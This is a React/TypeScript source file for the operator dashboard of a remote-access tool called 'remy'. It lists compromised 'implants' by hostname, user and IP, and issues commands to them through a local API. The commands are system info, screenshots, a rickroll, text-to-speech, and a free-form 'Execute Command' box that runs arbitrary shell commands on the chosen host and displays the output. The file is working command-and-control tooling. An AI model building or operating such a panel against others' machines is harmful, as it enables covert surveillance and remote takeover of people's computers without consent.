import { useState, useEffect } from 'react'
import { Monitor, Terminal, Play, Volume2, MessageSquare, Camera } from 'lucide-react'

interface Implant {
  id: string
  hostname: string
  os: string
  username: string
  ip: string
  last_seen: string
}

interface CommandResult {
  command_id: string
  success: boolean
  output: string
}

function App() {
  const [implants, setImplants] = useState<Implant[]>([])
  const [selected, setSelected] = useState<string | null>(null)
  const [command, setCommand] = useState('')
  const [results, setResults] = useState<CommandResult[]>([])
  const [loading, setLoading] = useState(false)

  useEffect(() => {
    fetchImplants()
    const interval = setInterval(fetchImplants, 5000)
    return () => clearInterval(interval)
  }, [])

  async function fetchImplants() {
    try {
      const res = await fetch('/api/implants')
      if (res.ok) {
        setImplants(await res.json())
      }
    } catch {
      // Server not running, use mock data
      setImplants([
        { id: 'demo-1', hostname: 'target-pc', os: 'linux x86_64', username: 'user', ip: '192.168.1.100', last_seen: new Date().toISOString() },
        { id: 'demo-2', hostname: 'server-01', os: 'windows amd64', username: 'admin', ip: '192.168.1.101', last_seen: new Date().toISOString() },
      ])
    }
  }

  async function sendCommand(type: string, args?: Record<string, unknown>) {
    if (!selected) return
    setLoading(true)
    try {
      const res = await fetch(`/api/implants/${selected}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: { type, args } })
      })
      if (res.ok) {
        const { command_id } = await res.json()
        // Poll for result
        setTimeout(() => checkResult(command_id), 2000)
      }
    } catch {
      setResults(prev => [...prev, { command_id: 'mock', success: true, output: `[Mock] ${type} executed` }])
    }
    setLoading(false)
  }

  async function checkResult(cmdId: string) {
    try {
      const res = await fetch(`/api/results/${cmdId}`)
      if (res.ok) {
        const result = await res.json()
        setResults(prev => [...prev, result])
      }
    } catch {
      // ignore
    }
  }

  function execCommand() {
    if (command.trim()) {
      sendCommand('Exec', { cmd: command })
      setCommand('')
    }
  }

  return (
    <div className="flex h-screen bg-zinc-950">
      {/* Sidebar */}
      <div className="w-64 bg-zinc-900 border-r border-zinc-800 p-4">
        <h1 className="text-xl font-bold text-white mb-6 flex items-center gap-2">
          <Monitor className="w-5 h-5 text-purple-500" />
          remy
        </h1>

        <div className="text-zinc-400 text-sm mb-2">Connected Devices</div>
        <div className="space-y-2">
          {implants.map(imp => (
            <button
              key={imp.id}
              onClick={() => setSelected(imp.id)}
              className={`w-full text-left p-3 rounded-lg transition ${
                selected === imp.id
                  ? 'bg-purple-600 text-white'
                  : 'bg-zinc-800 text-zinc-300 hover:bg-zinc-700'
              }`}
            >
              <div className="font-medium">{imp.hostname}</div>
              <div className="text-xs opacity-70">{imp.os}</div>
            </button>
          ))}
          {implants.length === 0 && (
            <div className="text-zinc-500 text-sm p-3">No devices connected</div>
          )}
        </div>
      </div>

      {/* Main */}
      <div className="flex-1 flex flex-col">
        {/* Header */}
        <div className="h-14 bg-zinc-900 border-b border-zinc-800 flex items-center px-6">
          <h2 className="text-white font-medium">
            {selected ? implants.find(i => i.id === selected)?.hostname : 'Select a device'}
          </h2>
        </div>

        {/* Content */}
        <div className="flex-1 p-6 overflow-auto">
          {selected ? (
            <div className="space-y-6">
              {/* Quick Actions */}
              <div className="grid grid-cols-4 gap-4">
                <button
                  onClick={() => sendCommand('SysInfo')}
                  className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition"
                >
                  <Monitor className="w-6 h-6 text-blue-400 mx-auto mb-2" />
                  <div className="text-sm text-zinc-300">System Info</div>
                </button>
                <button
                  onClick={() => sendCommand('Screenshot')}
                  className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition"
                >
                  <Camera className="w-6 h-6 text-green-400 mx-auto mb-2" />
                  <div className="text-sm text-zinc-300">Screenshot</div>
                </button>
                <button
                  onClick={() => sendCommand('Rickroll')}
                  className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition"
                >
                  <Play className="w-6 h-6 text-red-400 mx-auto mb-2" />
                  <div className="text-sm text-zinc-300">Rickroll</div>
                </button>
                <button
                  onClick={() => sendCommand('Speak', { message: 'Hello from remy!' })}
                  className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition"
                >
                  <Volume2 className="w-6 h-6 text-yellow-400 mx-auto mb-2" />
                  <div className="text-sm text-zinc-300">Speak</div>
                </button>
              </div>

              {/* Command Input */}
              <div className="bg-zinc-900 rounded-lg p-4">
                <div className="flex items-center gap-2 mb-3">
                  <Terminal className="w-4 h-4 text-zinc-400" />
                  <span className="text-sm text-zinc-400">Execute Command</span>
                </div>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={command}
                    onChange={e => setCommand(e.target.value)}
                    onKeyDown={e => e.key === 'Enter' && execCommand()}
                    placeholder="whoami"
                    className="flex-1 bg-zinc-800 border border-zinc-700 rounded px-3 py-2 text-white placeholder-zinc-500 focus:outline-none focus:border-purple-500"
                  />
                  <button
                    onClick={execCommand}
                    disabled={loading || !command.trim()}
                    className="px-4 py-2 bg-purple-600 text-white rounded hover:bg-purple-500 disabled:opacity-50 transition"
                  >
                    Run
                  </button>
                </div>
              </div>

              {/* Results */}
              <div className="bg-zinc-900 rounded-lg p-4">
                <div className="flex items-center gap-2 mb-3">
                  <MessageSquare className="w-4 h-4 text-zinc-400" />
                  <span className="text-sm text-zinc-400">Output</span>
                </div>
                <div className="bg-zinc-950 rounded p-3 font-mono text-sm text-zinc-300 max-h-96 overflow-auto">
                  {results.length === 0 ? (
                    <span className="text-zinc-500">No output yet</span>
                  ) : (
                    results.map((r, i) => (
                      <div key={i} className="mb-2">
                        <span className={r.success ? 'text-green-400' : 'text-red-400'}>
                          {r.success ? '>' : '!'}
                        </span>
                        <pre className="whitespace-pre-wrap inline">{r.output}</pre>
                      </div>
                    ))
                  )}
                </div>
              </div>
            </div>
          ) : (
            <div className="flex items-center justify-center h-full text-zinc-500">
              Select a device from the sidebar
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

export default App
